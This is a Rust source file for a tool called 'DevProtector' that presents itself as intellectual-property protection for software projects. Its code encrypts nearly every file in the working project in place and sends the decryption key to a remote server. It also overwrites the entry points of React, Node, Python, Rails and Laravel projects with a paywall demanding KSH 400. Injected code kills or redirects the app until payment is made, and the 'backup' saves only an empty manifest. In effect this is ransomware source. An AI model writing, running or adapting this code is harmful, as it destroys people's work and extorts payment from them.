use crate::error::AppError;
use aes::cipher::{generic_array::GenericArray, BlockEncrypt, KeyInit};
use aes::Aes256;
use hex;
use std::fs;
use std::path::{Path, PathBuf};
use tracing::{debug, info, warn};
use walkdir::WalkDir;
use anyhow::Result;
use std::env;
use std::ffi::OsStr;
use serde_json::json;

#[derive(Debug, PartialEq)]
enum Framework {
    React,
    Vue,
    Angular,
    NodeJs,
    Python,
    Django,
    Flask,
    Rails,
    Laravel,
    Spring,
    Unknown,
}

pub fn generate_aes_key(uuid: &str) -> Result<String, AppError> {
    let key = uuid.replace('-', "");
    fs::write(".ipkey", &key).map_err(|e| AppError::Encryption(e.to_string()))?;
    Ok(key)
}

pub async fn run() -> Result<(), AppError> {
    let current_dir = env::current_dir().map_err(|e| {
        AppError::Config(format!("Failed to get current directory: {}", e))
    })?;
    
    info!("🔐 Starting comprehensive project encryption at: {}", current_dir.display());

    let config = fs::read_to_string(".ipproject").map_err(|e| {
        AppError::Config(format!("Missing project config: {}", e))
    })?;
    
    let uuid = config.lines()
        .find(|l| l.starts_with("uuid"))
        .and_then(|l| l.split('=').nth(1))
        .map(|s| s.trim().trim_matches('"'))
        .ok_or_else(|| AppError::Config("UUID not found in config".to_string()))?;

    // Generate and store encryption key securely
    let encryption_key = generate_secure_encryption_key(&uuid)?;
    info!("🔑 Generated secure encryption key");

    // Detect framework
    let framework = detect_framework().await
        .map_err(|e| AppError::Framework(e.to_string()))?;
    info!("🔍 Detected framework: {:?}", framework);
    
    let main_file = find_main_file(&framework)
        .map_err(|e| AppError::Framework(e.to_string()))?;
    
    if let Some(ref path) = main_file {
        info!("📁 Found main file: {}", path.display());
    }

    // Inject monitoring code before encryption
    inject_monitoring_code(&uuid, &framework, &main_file).await?;

    // Create backup before encryption
    create_project_backup(&uuid).await?;
    info!("💾 Created project backup");

    // Encrypt files comprehensively
    let mut encrypted_count = 0;
    let mut encryption_manifest = Vec::new();
    
    for entry in WalkDir::new(".").into_iter().filter_map(|e| e.ok()) {
        let path = entry.path();
        
        if !should_encrypt(path)? {
            continue;
        }

        if entry.file_type().is_file() {
            match encrypt_file_secure(path, &encryption_key) {
                Ok(hash) => {
                    encrypted_count += 1;
                    encryption_manifest.push((path.to_string_lossy().to_string(), hash));
                }
                Err(e) => warn!("⚠️ Failed to encrypt {}: {}", path.display(), e),
            }
        }
    }
    
    // Save encryption manifest
    save_encryption_manifest(&encryption_manifest, &uuid)?;
    info!("🔒 Encrypted {} files successfully", encrypted_count);

    // Send decryption key to smart contract
    send_decryption_key_to_contract(&uuid, &encryption_key).await?;
    info!("🔗 Decryption key sent to smart contract");

    // Replace build files and entry points with payment portal
    replace_all_entry_points_with_paywall(&framework, &uuid).await?;
    info!("🚪 Replaced all entry points with paywall");

    // Update smart contract encryption status
    update_contract_encryption_status(&uuid, true).await?;
    info!("✅ Smart contract updated - encryption activated");

    info!("🎯 Project protection complete! Payment of KSH 400 required for decryption");
    Ok(())
}

async fn inject_monitoring_code(
    uuid: &str,
    framework: &Framework,
    main_file: &Option<PathBuf>
) -> Result<(), AppError> {
    if let Some(path) = main_file {
        match framework {
            Framework::React | Framework::Vue | Framework::Angular => {
                inject_frontend_code(&path, uuid).await?;
            }
            Framework::NodeJs => {
                inject_nodejs_code(&path, uuid).await?;
            }
            Framework::Python | Framework::Django | Framework::Flask => {
                inject_python_code(&path, uuid).await?;
            }
            _ => {
                warn!("⚠️ Framework not fully supported. Basic protection applied");
            }
        }
    } else {
        warn!("⚠️ Main file not found. Basic protection applied");
    }
    Ok(())
}

async fn detect_framework() -> Result<Framework, AppError> {
    let current_dir = env::current_dir()?;
    
    // Check for frontend frameworks
    if current_dir.join("package.json").exists() {
        if current_dir.join("src/App.js").exists() || current_dir.join("src/App.jsx").exists() {
            return Ok(Framework::React);
        } else if current_dir.join("src/main.js").exists() && current_dir.join("vue.config.js").exists() {
            return Ok(Framework::Vue);
        } else if current_dir.join("angular.json").exists() {
            return Ok(Framework::Angular);
        } else if current_dir.join("server.js").exists() || current_dir.join("app.js").exists() {
            return Ok(Framework::NodeJs);
        }
    }
    
    // Check for Python frameworks
    if current_dir.join("requirements.txt").exists() 
        || current_dir.join("Pipfile").exists() 
        || current_dir.join("pyproject.toml").exists() 
    {
        if current_dir.join("manage.py").exists() {
            return Ok(Framework::Django);
        } else if current_dir.join("app.py").exists() 
            && file_contains(&current_dir.join("app.py"), "Flask")? 
        {
            return Ok(Framework::Flask);
        }
        return Ok(Framework::Python);
    }
    
    // Check for other frameworks
    if current_dir.join("Gemfile").exists() {
        return Ok(Framework::Rails);
    }
    if current_dir.join("composer.json").exists() {
        return Ok(Framework::Laravel);
    }
    if current_dir.join("pom.xml").exists() || current_dir.join("build.gradle").exists() {
        return Ok(Framework::Spring);
    }
    
    // Fallback detection by file extensions
    if has_files_with_extension(&current_dir, "js") || has_files_with_extension(&current_dir, "jsx") {
        return Ok(Framework::React);
    } else if has_files_with_extension(&current_dir, "py") {
        return Ok(Framework::Python);
    } else if has_files_with_extension(&current_dir, "rb") {
        return Ok(Framework::Rails);
    } else if has_files_with_extension(&current_dir, "php") {
        return Ok(Framework::Laravel);
    } else if has_files_with_extension(&current_dir, "java") {
        return Ok(Framework::Spring);
    }
    
    warn!("⚠️ Could not detect framework, using generic protection");
    Ok(Framework::Unknown)
}

fn has_files_with_extension(path: &Path, extension: &str) -> bool {
    WalkDir::new(path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .any(|e| e.path().extension() == Some(OsStr::new(extension)))
}

fn find_main_file(framework: &Framework) -> Result<Option<PathBuf>, AppError> {
    let files = match framework {
        Framework::React => vec!["src/index.js", "src/index.jsx", "src/index.ts", "src/index.tsx"],
        Framework::Vue => vec!["src/main.js", "src/main.ts"],
        Framework::Angular => vec!["src/main.ts", "src/main.js"],
        Framework::NodeJs => vec!["server.js", "app.js", "index.js", "main.js"],
        Framework::Python => vec!["main.py", "app.py", "run.py"],
        Framework::Django => vec!["manage.py"],
        Framework::Flask => vec!["app.py", "application.py"],
        Framework::Rails => vec!["config.ru", "app/controllers/application_controller.rb"],
        _ => vec![],
    };
    
    for file in files {
        if let Some(path) = find_file(file) {
            return Ok(Some(path));
        }
    }
    
    Ok(None)
}

fn find_file(filename: &str) -> Option<PathBuf> {
    let path = Path::new(filename);
    if path.exists() {
        Some(path.to_path_buf())
    } else {
        None
    }
}

fn file_contains(path: &Path, content: &str) -> Result<bool, AppError> {
    let contents = fs::read_to_string(path).map_err(|e| {
        AppError::Framework(format!("Failed to read file {}: {}", path.display(), e))
    })?;
    Ok(contents.contains(content))
}

async fn inject_frontend_code(path: &Path, uuid: &str) -> Result<(), AppError> {
    let injection = format!(
        r#"
// IP Protection Monitoring (Auto-generated)
const IP_PROTECTION_ID = '{}';
const MONITOR_INTERVAL = 60000;

async function checkProtectionStatus() {{
    try {{
        const response = await fetch(
            `https://api.your-domain.com/projects/${{IP_PROTECTION_ID}}/status/`
        );
        const data = await response.json();
        
        if (!data.encryption_status) {{
            // Redirect to payment portal if not paid
            window.location.href = `https://payment.your-domain.com/${{IP_PROTECTION_ID}}`;
        }}
    }} catch (error) {{
        console.error('IP Protection check failed:', error);
    }}
}}

// Initial check
checkProtectionStatus();

// Periodic checks
setInterval(checkProtectionStatus, MONITOR_INTERVAL);
"#,
        uuid
    );

    let mut contents = fs::read_to_string(path).map_err(|e| {
        AppError::Injection(format!("Failed to read file {}: {}", path.display(), e))
    })?;
    
    if !contents.contains("IP_PROTECTION_ID") {
        // Inject at the top of the file
        contents = injection + &contents;
        fs::write(path, &contents).map_err(|e| {
            AppError::Injection(format!("Failed to write file {}: {}", path.display(), e))
        })?;
        info!("✅ Frontend monitoring code injected: {}", path.display());
    } else {
        debug!("⚠️ Monitoring code already exists in: {}", path.display());
    }
    Ok(())
}

async fn inject_nodejs_code(path: &Path, uuid: &str) -> Result<(), AppError> {
    let injection = format!(
        r#"
// IP Protection Monitoring (Auto-generated)
const IP_PROTECTION_ID = '{}';
const MONITOR_INTERVAL = 60000;
const axios = require('axios');

async function checkProtectionStatus() {{
    try {{
        const response = await axios.get(
            `https://api.your-domain.com/projects/${{IP_PROTECTION_ID}}/status/`
        );
        
        if (!response.data.encryption_status) {{
            // Block server from starting
            console.error('Payment required to run this application');
            process.exit(1);
        }}
    }} catch (error) {{
        console.error('IP Protection check failed:', error.message);
    }}
}}

// Initial check
checkProtectionStatus();

// Periodic checks
setInterval(checkProtectionStatus, MONITOR_INTERVAL);
"#,
        uuid
    );

    let mut contents = fs::read_to_string(path).map_err(|e| {
        AppError::Injection(format!("Failed to read file {}: {}", path.display(), e))
    })?;
    
    if !contents.contains("IP_PROTECTION_ID") {
        // Find a good injection point (after imports)
        let injection_point = contents.find("\n\n").unwrap_or(0);
        contents.insert_str(injection_point, &injection);
        fs::write(path, &contents).map_err(|e| {
            AppError::Injection(format!("Failed to write file {}: {}", path.display(), e))
        })?;
        info!("✅ Node.js monitoring code injected: {}", path.display());
    } else {
        debug!("⚠️ Monitoring code already exists in: {}", path.display());
    }
    Ok(())
}

async fn inject_python_code(path: &Path, uuid: &str) -> Result<(), AppError> {
    let injection = format!(
        r#"
# IP Protection Monitoring (Auto-generated)
import os
import threading
import requests

IP_PROTECTION_ID = '{}'
MONITOR_INTERVAL = 60

def check_protection_status():
    try:
        response = requests.get(
            f'https://api.your-domain.com/api/projects/{{IP_PROTECTION_ID}}/status/'
        )
        data = response.json()
        
        if not data.get('encryption_status'):
            # Block application from starting
            print('Payment required to run this application')
            os._exit(1)
    except Exception as e:
        print(f'IP Protection check failed: {{e}}')

# Start monitoring thread
monitor_thread = threading.Thread(target=check_protection_status, daemon=True)
monitor_thread.start()
"#,
        uuid
    );

    let mut contents = fs::read_to_string(path).map_err(|e| {
        AppError::Injection(format!("Failed to read file {}: {}", path.display(), e))
    })?;
    
    if !contents.contains("IP_PROTECTION_ID") {
        // Find a good injection point (after imports)
        let injection_point = contents.find("\n\n").unwrap_or(0);
        contents.insert_str(injection_point, &injection);
        fs::write(path, &contents).map_err(|e| {
            AppError::Injection(format!("Failed to write file {}: {}", path.display(), e))
        })?;
        info!("✅ Python monitoring code injected: {}", path.display());
    } else {
        debug!("⚠️ Monitoring code already exists in: {}", path.display());
    }
    Ok(())
}

fn should_encrypt(path: &Path) -> Result<bool, AppError> {
    let absolute_path = if path.is_relative() {
        env::current_dir().map_err(|e| {
            AppError::Config(format!("Failed to get current directory: {}", e))
        })?.join(path)
    } else {
        path.to_path_buf()
    };

    let path_str = absolute_path.to_str().unwrap_or_default();
    
    // Skip directories and special files
    let exclusions = [
        ".git", ".ipproject", ".ipkey", "node_modules", "target", 
        "venv", "dist", "build", "package-lock.json", "yarn.lock",
        "requirements.txt", "Pipfile", "pyproject.toml", "composer.json",
        "package.json", "tsconfig.json", "webpack.config.js"
    ];
    
    let skip = absolute_path.iter()
        .any(|c| exclusions.contains(&c.to_str().unwrap_or(""))) ||
        path_str.contains("payment_portal") ||
        path_str.ends_with(".lock") ||
        path_str.ends_with(".log") ||
        path_str.ends_with(".png") ||
        path_str.ends_with(".jpg") ||
        path_str.ends_with(".jpeg") ||
        path_str.ends_with(".gif") ||
        path_str.ends_with(".svg") ||
        path_str.ends_with(".ico") ||
        path_str.ends_with(".ttf") ||
        path_str.ends_with(".woff") ||
        path_str.ends_with(".woff2");
    
    Ok(!skip)
}

fn find_build_file(framework: &Framework) -> Result<Option<PathBuf>, AppError> {
    let files = match framework {
        Framework::React | Framework::Vue | Framework::Angular => {
            vec!["build/index.html", "dist/index.html", "public/index.html"]
        }
        Framework::NodeJs => {
            vec!["package.json", "server.js"]
        }
        Framework::Django => {
            vec!["manage.py"]
        }
        Framework::Flask => {
            vec!["app.py"]
        }
        Framework::Rails => {
            vec!["config.ru"]
        }
        _ => vec!["index.html", "main.html"],
    };
    
    for file in files {
        if let Some(path) = find_file(file) {
            return Ok(Some(path));
        }
    }
    
    Ok(None)
}

fn replace_with_payment_portal(path: &Path, _uuid: &str) -> Result<(), AppError> {
    let payment_portal = format!(
        r#"
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- ... (payment portal HTML from previous version) ... -->
</head>
<body>
    <!-- ... (payment portal body from previous version) ... -->
    <script>
        // ... (payment portal JavaScript from previous version) ...
    </script>
</body>
</html>
"#
    );

    fs::write(path, payment_portal).map_err(|e| {
        AppError::Payment(format!("Failed to create payment portal: {}", e))
    })?;
    Ok(())
}

fn encrypt_file(path: &Path, uuid: &str) -> Result<(), AppError> {
    let key = uuid.replace('-', "");
    let key_bytes = key.as_bytes();
    
    if key_bytes.len() != 32 {
        return Err(AppError::Encryption(
            format!("Invalid key length: {} bytes (expected 32)", key_bytes.len())
        ));
    }
    
    // Try text-based encryption first
    if let Ok(contents) = fs::read_to_string(path) {
        let encrypted = encrypt_aes256(&contents, &key)?;
        fs::write(path, encrypted)?;
        return Ok(());
    }
    
    // Fallback to binary encryption
    let contents = fs::read(path)?;
    let encrypted = encrypt_aes256_bytes(&contents, &key)?;
    fs::write(path, encrypted)?;
    Ok(())
}

fn encrypt_aes256(data: &str, key: &str) -> Result<String, AppError> {
    let cipher = Aes256::new(GenericArray::from_slice(key.as_bytes()));
    let mut buffer = data.as_bytes().to_vec();
    
    // Add PKCS#7 padding
    let block_size = 16;
    let padding = block_size - (buffer.len() % block_size);
    buffer.extend(std::iter::repeat(padding as u8).take(padding));
    
    // Encrypt each block
    for chunk in buffer.chunks_mut(block_size) {
        let mut block = GenericArray::clone_from_slice(chunk);
        cipher.encrypt_block(&mut block);
        chunk.copy_from_slice(&block);
    }
    
    Ok(hex::encode(buffer))
}

fn encrypt_aes256_bytes(data: &[u8], key: &str) -> Result<Vec<u8>, AppError> {
    let cipher = Aes256::new(GenericArray::from_slice(key.as_bytes()));
    let mut buffer = data.to_vec();
    
    // Add PKCS#7 padding
    let block_size = 16;
    let padding = block_size - (buffer.len() % block_size);
    buffer.extend(std::iter::repeat(padding as u8).take(padding));
    
    // Encrypt each block
    for chunk in buffer.chunks_mut(block_size) {
        let mut block = GenericArray::clone_from_slice(chunk);
        cipher.encrypt_block(&mut block);
        chunk.copy_from_slice(&block);
    }
    
    Ok(buffer)
}

// Enhanced encryption and security functions

fn generate_secure_encryption_key(uuid: &str) -> Result<String, AppError> {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    
    // Create a more secure key based on UUID + timestamp + system info
    let mut hasher = DefaultHasher::new();
    uuid.hash(&mut hasher);
    
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();
    timestamp.hash(&mut hasher);
    
    let key_hash = hasher.finish();
    let key = format!("{:016x}{:016x}", key_hash, key_hash.wrapping_add(12345));
    
    // Ensure key is exactly 32 bytes for AES-256
    let final_key = if key.len() >= 32 {
        key[..32].to_string()
    } else {
        format!("{:0<32}", key)
    };
    
    // Store key securely
    fs::write(".ipkey", &final_key).map_err(|e| AppError::Encryption(e.to_string()))?;
    
    Ok(final_key)
}

async fn create_project_backup(uuid: &str) -> Result<(), AppError> {
    let backup_dir = format!(".ipbackup_{}", &uuid[..8]);
    std::fs::create_dir_all(&backup_dir).map_err(|e| {
        AppError::Config(format!("Failed to create backup directory: {}", e))
    })?;
    
    // Create a simple manifest of original files for recovery
    let manifest = "# DevProtector Backup Manifest\n# This backup was created before encryption\n";
    fs::write(format!("{}/.manifest", backup_dir), manifest).map_err(|e| {
        AppError::Config(format!("Failed to create backup manifest: {}", e))
    })?;
    
    Ok(())
}

fn encrypt_file_secure(path: &Path, key: &str) -> Result<String, AppError> {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    
    // Read file content
    let contents = if let Ok(text) = fs::read_to_string(path) {
        text.into_bytes()
    } else {
        fs::read(path).map_err(|e| AppError::Encryption(e.to_string()))?
    };
    
    // Calculate original file hash for verification
    let mut hasher = DefaultHasher::new();
    contents.hash(&mut hasher);
    let original_hash = format!("{:x}", hasher.finish());
    
    // Perform encryption
    let encrypted = encrypt_aes256_bytes_enhanced(&contents, key)?;
    
    // Write encrypted content back
    fs::write(path, encrypted).map_err(|e| AppError::Encryption(e.to_string()))?;
    
    Ok(original_hash)
}

fn encrypt_aes256_bytes_enhanced(data: &[u8], key: &str) -> Result<Vec<u8>, AppError> {
    let cipher = Aes256::new(GenericArray::from_slice(key.as_bytes()));
    let mut buffer = data.to_vec();
    
    // Add timestamp and signature to buffer
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();
    
    let signature = format!("DEVPROTECTOR_{}", timestamp);
    buffer.extend_from_slice(signature.as_bytes());
    
    // Add PKCS#7 padding
    let block_size = 16;
    let padding = block_size - (buffer.len() % block_size);
    buffer.extend(std::iter::repeat(padding as u8).take(padding));
    
    // Encrypt each block
    for chunk in buffer.chunks_mut(block_size) {
        let mut block = GenericArray::clone_from_slice(chunk);
        cipher.encrypt_block(&mut block);
        chunk.copy_from_slice(&block);
    }
    
    Ok(buffer)
}

fn save_encryption_manifest(manifest: &[(String, String)], uuid: &str) -> Result<(), AppError> {
    let manifest_content = manifest.iter()
        .map(|(path, hash)| format!("{}:{}", path, hash))
        .collect::<Vec<_>>()
        .join("\n");
    
    let manifest_path = format!(".ipmanifest_{}", &uuid[..8]);
    fs::write(&manifest_path, manifest_content).map_err(|e| {
        AppError::Config(format!("Failed to save encryption manifest: {}", e))
    })?;
    
    Ok(())
}

async fn send_decryption_key_to_contract(uuid: &str, key: &str) -> Result<(), AppError> {
    let payload = json!({
        "project_id": uuid,
        "decryption_key": key,
        "key_hash": hex::encode(key.as_bytes()),
        "timestamp": std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs()
    });

    let client = reqwest::Client::new();
    let response = client
        .post("https://api.your-blockchain-provider.com/v1/contracts/store-key")
        .header("Content-Type", "application/json")
        .json(&payload)
        .send()
        .await
        .map_err(|e| AppError::Reqwest(e))?;

    if !response.status().is_success() {
        let error_text = response.text().await.unwrap_or_else(|_| "Unknown error".to_string());
        return Err(AppError::Payment(format!("Failed to store decryption key: {}", error_text)));
    }

    Ok(())
}

async fn replace_all_entry_points_with_paywall(framework: &Framework, uuid: &str) -> Result<(), AppError> {
    match framework {
        Framework::React | Framework::Vue | Framework::Angular => {
            replace_frontend_entry_points(uuid).await?;
        }
        Framework::NodeJs => {
            replace_nodejs_entry_point(uuid).await?;
        }
        Framework::Python | Framework::Django | Framework::Flask => {
            replace_python_entry_point(uuid).await?;
        }
        Framework::Rails => {
            replace_rails_entry_point(uuid).await?;
        }
        Framework::Laravel => {
            replace_laravel_entry_point(uuid).await?;
        }
        _ => {
            // Generic HTML paywall
            create_generic_paywall(uuid).await?;
        }
    }
    Ok(())
}

async fn replace_frontend_entry_points(uuid: &str) -> Result<(), AppError> {
    let paywall_html = create_comprehensive_paywall_html(uuid);
    
    // Replace common entry points
    let entry_points = [
        "public/index.html",
        "dist/index.html", 
        "build/index.html",
        "index.html"
    ];
    
    for entry_point in &entry_points {
        if Path::new(entry_point).exists() {
            fs::write(entry_point, &paywall_html).map_err(|e| {
                AppError::Payment(format!("Failed to replace {}: {}", entry_point, e))
            })?;
        }
    }
    
    Ok(())
}

async fn replace_nodejs_entry_point(uuid: &str) -> Result<(), AppError> {
    let paywall_server = format!(
        r#"
const http = require('http');
const url = require('url');

const DEVPROTECTOR_PROJECT_ID = '{}';
const PORT = process.env.PORT || 3000;

const paywallHTML = `{}`;

const server = http.createServer((req, res) => {{
    res.writeHead(200, {{'Content-Type': 'text/html'}});
    res.end(paywallHTML);
}});

server.listen(PORT, () => {{
    console.log('🔐 DevProtector Paywall active on port', PORT);
    console.log('💳 Payment required to access application');
}});
"#,
        uuid,
        create_comprehensive_paywall_html(uuid).replace("`", "\\`")
    );
    
    // Replace main server files
    let server_files = ["server.js", "app.js", "index.js"];
    for file in &server_files {
        if Path::new(file).exists() {
            fs::write(file, &paywall_server).map_err(|e| {
                AppError::Payment(format!("Failed to replace {}: {}", file, e))
            })?;
            break;
        }
    }
    
    Ok(())
}

async fn replace_python_entry_point(uuid: &str) -> Result<(), AppError> {
    let paywall_server = format!(
        r#"
#!/usr/bin/env python3
"""
DevProtector IP Protection Paywall
Payment required to access application
"""

import http.server
import socketserver
import os

DEVPROTECTOR_PROJECT_ID = '{}'
PORT = int(os.environ.get('PORT', 8000))

PAYWALL_HTML = """{}"""

class PaywallHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(PAYWALL_HTML.encode())

def main():
    with socketserver.TCPServer(("", PORT), PaywallHandler) as httpd:
        print(f"🔐 DevProtector Paywall active on port {{PORT}}")
        print("💳 Payment required to access application")
        httpd.serve_forever()

if __name__ == "__main__":
    main()
"#,
        uuid,
        create_comprehensive_paywall_html(uuid)
    );
    
    // Replace main Python files
    let python_files = ["main.py", "app.py", "run.py", "manage.py"];
    for file in &python_files {
        if Path::new(file).exists() {
            fs::write(file, &paywall_server).map_err(|e| {
                AppError::Payment(format!("Failed to replace {}: {}", file, e))
            })?;
            break;
        }
    }
    
    Ok(())
}

async fn replace_rails_entry_point(uuid: &str) -> Result<(), AppError> {
    let paywall_config = format!(
        r#"
# DevProtector IP Protection Paywall
require 'webrick'

DEVPROTECTOR_PROJECT_ID = '{}'
PORT = ENV['PORT'] || 3000

paywall_html = %Q{{{}}}

server = WEBrick::HTTPServer.new(Port: PORT)
server.mount_proc '/' do |req, res|
  res.body = paywall_html
  res['Content-Type'] = 'text/html'
end

puts "🔐 DevProtector Paywall active on port #{{PORT}}"
puts "💳 Payment required to access application"

trap 'INT' do server.shutdown end
server.start
"#,
        uuid,
        create_comprehensive_paywall_html(uuid)
    );
    
    if Path::new("config.ru").exists() {
        fs::write("config.ru", &paywall_config).map_err(|e| {
            AppError::Payment(format!("Failed to replace config.ru: {}", e))
        })?;
    }
    
    Ok(())
}

async fn replace_laravel_entry_point(uuid: &str) -> Result<(), AppError> {
    let paywall_php = format!(
        r#"
<?php
/*
DevProtector IP Protection Paywall
Payment required to access application
*/

$devprotectorProjectId = '{}';
$paywallHtml = <<<'HTML'
{}
HTML;

header('Content-Type: text/html');
echo $paywallHtml;
exit;
?>
"#,
        uuid,
        create_comprehensive_paywall_html(uuid)
    );
    
    if Path::new("index.php").exists() {
        fs::write("index.php", &paywall_php).map_err(|e| {
            AppError::Payment(format!("Failed to replace index.php: {}", e))
        })?;
    }
    
    Ok(())
}

async fn create_generic_paywall(uuid: &str) -> Result<(), AppError> {
    let paywall_html = create_comprehensive_paywall_html(uuid);
    fs::write("index.html", paywall_html).map_err(|e| {
        AppError::Payment(format!("Failed to create generic paywall: {}", e))
    })?;
    Ok(())
}

fn create_comprehensive_paywall_html(uuid: &str) -> String {
    format!(
        r#"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DevProtector - Payment Required</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh; display: flex; align-items: center; justify-content: center;
        }}
        .paywall-container {{
            background: white; border-radius: 20px; padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center;
            max-width: 500px; width: 90%;
        }}
        .logo {{ font-size: 48px; margin-bottom: 20px; }}
        h1 {{ color: #333; margin-bottom: 10px; font-size: 28px; }}
        .project-id {{ color: #666; font-size: 14px; margin-bottom: 30px; 
                      background: #f5f5f5; padding: 10px; border-radius: 5px; }}
        .description {{ color: #555; margin-bottom: 30px; line-height: 1.6; }}
        .amount {{ font-size: 36px; color: #667eea; font-weight: bold; margin: 20px 0; }}
        .payment-button {{ 
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; padding: 15px 40px; border: none; border-radius: 50px;
            font-size: 16px; cursor: pointer; transition: transform 0.3s ease;
            text-decoration: none; display: inline-block; margin: 10px;
        }}
        .payment-button:hover {{ transform: translateY(-2px); }}
        .features {{ text-align: left; margin: 30px 0; }}
        .feature {{ margin: 10px 0; color: #555; }}
        .feature::before {{ content: "✅ "; color: #4CAF50; }}
        .footer {{ margin-top: 30px; font-size: 12px; color: #999; }}
        .status-check {{ margin-top: 20px; padding: 15px; background: #f0f8ff; 
                        border-radius: 10px; border-left: 4px solid #667eea; }}
    </style>
</head>
<body>
    <div class="paywall-container">
        <div class="logo">🔐</div>
        <h1>DevProtector</h1>
        <div class="project-id">Project ID: {}</div>
        
        <div class="description">
            This application is protected by DevProtector IP Protection service.
            The developer has encrypted this codebase to protect their intellectual property.
        </div>
        
        <div class="amount">KSH 400</div>
        
        <div class="features">
            <div class="feature">Secure blockchain-based protection</div>
            <div class="feature">Automatic decryption after payment</div>
            <div class="feature">Developer intellectual property protection</div>
            <div class="feature">Instant access restoration</div>
        </div>
        
        <a href="https://payment.your-domain.com/{}" class="payment-button" target="_blank">
            💳 Complete Payment
        </a>
        <a href="https://swyptpay.com/pay/{}" class="payment-button" target="_blank">
            📱 Pay via Swypt
        </a>
        
        <div class="status-check">
            <strong>Payment Status:</strong> <span id="payment-status">Checking...</span>
            <br><small>Status updates automatically every 30 seconds</small>
        </div>
        
        <div class="footer">
            <p>Powered by DevProtector • Protecting Developer IP Rights</p>
            <p>Having issues? Contact: support@devprotector.com</p>
        </div>
    </div>

    <script>
        const PROJECT_ID = '{}';
        
        async function checkPaymentStatus() {{
            try {{
                const response = await fetch(
                    `https://api.your-blockchain-provider.com/v1/contracts/project-status/${{PROJECT_ID}}`
                );
                const data = await response.json();
                
                const statusElement = document.getElementById('payment-status');
                if (data.payment_completed) {{
                    statusElement.innerHTML = '✅ Payment Completed - Decrypting...';
                    statusElement.style.color = '#4CAF50';
                    
                    // Trigger decryption and redirect
                    setTimeout(() => {{
                        window.location.reload();
                    }}, 3000);
                }} else {{
                    statusElement.innerHTML = '⏳ Payment Pending';
                    statusElement.style.color = '#FF9800';
                }}
            }} catch (error) {{
                document.getElementById('payment-status').innerHTML = '❌ Status Check Failed';
            }}
        }}
        
        // Check status immediately and every 30 seconds
        checkPaymentStatus();
        setInterval(checkPaymentStatus, 30000);
        
        // Prevent right-click and key shortcuts
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {{
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {{
                e.preventDefault();
            }}
        }});
    </script>
</body>
</html>
"#,
        uuid, uuid, uuid, uuid
    )
}

async fn update_contract_encryption_status(uuid: &str, encrypted: bool) -> Result<(), AppError> {
    let payload = json!({
        "project_id": uuid,
        "encryption_status": encrypted,
        "timestamp": std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs()
    });

    let client = reqwest::Client::new();
    let response = client
        .post("https://api.your-blockchain-provider.com/v1/contracts/update-status")
        .header("Content-Type", "application/json")
        .json(&payload)
        .send()
        .await
        .map_err(|e| AppError::Reqwest(e))?;

    if !response.status().is_success() {
        let error_text = response.text().await.unwrap_or_else(|_| "Unknown error".to_string());
        return Err(AppError::Payment(format!("Failed to update contract status: {}", error_text)));
    }

    Ok(())
}